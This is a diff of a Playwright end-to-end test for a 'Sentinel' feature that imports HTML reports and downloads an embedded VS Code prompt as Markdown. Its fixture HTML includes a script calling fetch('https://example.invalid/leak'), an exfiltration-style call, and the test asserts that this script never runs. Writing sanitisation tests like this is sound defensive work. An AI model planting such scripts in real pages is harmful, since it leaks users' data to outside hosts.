@@ -178,13 +178,11 @@ test("Sentinel : télécharge le prompt Markdown exact depuis une carte existant
   const html = `<title>Sentinel avec prompt</title><h1>Rapport</h1><script>window.promptScriptRan = true; fetch('https://example.invalid/leak')</script><section><h2>PROMPT COMPLET POUR VS CODE / CODEX</h2><textarea id="fullPrompt">${prompt.replaceAll("&", "&amp;").replaceAll("<", "&lt;")}</textarea></section>`;
   await page.goto("/");
   await nav(page, "Sentinel");
-  await page
-    .getByLabel("Fichiers HTML à importer")
-    .setInputFiles({
-      name: "SENTINEL_TEST.html",
-      mimeType: "text/html",
-      buffer: Buffer.from(html),
-    });
+  await page.getByLabel("Fichiers HTML à importer").setInputFiles({
+    name: "SENTINEL_TEST.html",
+    mimeType: "text/html",
+    buffer: Buffer.from(html),
+  });
   await page
     .getByRole("button", {
       name: "Enregistrer dans ma bibliothèque",
@@ -194,15 +192,16 @@ test("Sentinel : télécharge le prompt Markdown exact depuis une carte existant
   await expect(page.getByRole("dialog")).toHaveCount(0);
   await page.reload();
   await nav(page, "Sentinel");
-  const card = page
-    .locator(".collection-card")
-    .filter({
-      has: page.getByRole("heading", {
-        name: "Sentinel avec prompt",
-        exact: true,
-      }),
-    });
+  const card = page.locator(".collection-card").filter({
+    has: page.getByRole("heading", {
+      name: "Sentinel avec prompt",
+      exact: true,
+    }),
+  });
   await context.setOffline(true);
+  await card
+    .getByRole("button", { name: "Voir les prompts VS Code", exact: true })
+    .click();
   const downloaded = page.waitForEvent("download");
   await card
     .getByRole("button", {
@@ -213,7 +212,7 @@ test("Sentinel : télécharge le prompt Markdown exact depuis une carte existant
   const file = await downloaded;
   expect(file.suggestedFilename()).toBe("SENTINEL_TEST_PROMPT_VSCODE.md");
   expect(await readFile((await file.path())!, "utf8")).toBe(prompt);
-  await expect(card.getByRole("status")).toHaveText(
+  await expect(card.getByRole("status")).toContainText(
     "Téléchargement du prompt lancé.",
   );
   expect(await page.evaluate(() => "promptScriptRan" in window)).toBe(false);
@@ -234,16 +233,11 @@ test("Sentinel : télécharge le prompt Markdown exact depuis une carte existant
   }
   await context.setOffline(false);
   await importFile(page, "Sans prompt");
-  const missing = page
-    .locator(".collection-card")
-    .filter({
-      has: page.getByRole("heading", { name: "Sans prompt", exact: true }),
-    });
+  const missing = page.locator(".collection-card").filter({
+    has: page.getByRole("heading", { name: "Sans prompt", exact: true }),
+  });
   await missing
-    .getByRole("button", {
-      name: "Télécharger le prompt VS Code (.md)",
-      exact: true,
-    })
+    .getByRole("button", { name: "Voir les prompts VS Code", exact: true })
     .click();
   await expect(missing.getByRole("status")).toContainText(
     "Aucun prompt VS Code identifiable",
@@ -253,5 +247,5 @@ test("Sentinel : télécharge le prompt Markdown exact depuis une carte existant
       name: "Télécharger le prompt VS Code (.md)",
       exact: true,
     }),
-  ).toBeEnabled();
+  ).toHaveCount(0);
 });
